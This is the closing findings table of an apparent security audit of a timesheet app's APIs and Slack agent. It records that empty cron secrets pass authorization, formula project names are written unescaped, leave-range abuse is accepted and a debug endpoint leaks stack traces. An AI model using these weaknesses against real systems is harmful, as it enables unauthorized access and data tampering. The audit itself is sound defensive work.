| Unauthenticated timesheet GET/POST | `/api/timesheet/*` | 401 via session (+ middleware) |
| Empty cron secret | `/api/cron/*` | **Authorized** with `Bearer ` |
| Forged Slack event | `/api/slack/events` | 401 without valid HMAC |
| Replay Slack >5 min | `/api/slack/events` | Rejected in `verifySlackSignature` |
| Duplicate Slack event_id | `/api/slack/events` | Second delivery no-ops after dedupe |
| Modified staff ID in body | `/api/timesheet/submit` | Ignored; session EmployeeID used |
| Cross-user pending YES | Slack agent | `WRONG_USER` / claim fail |
| Oversized leave range | `/api/staff/leave` | Accepted (abuse) |
| Formula project name | submit + createProject | Written `USER_ENTERED` (**risk**) |
| CSRF cross-site POST | submit | Likely blocked by SameSite=Lax default (not explicit) |
| Debug stack probe | `/api/debug/zoho-test` | Stack returned if access granted |

---

*End of audit report.*
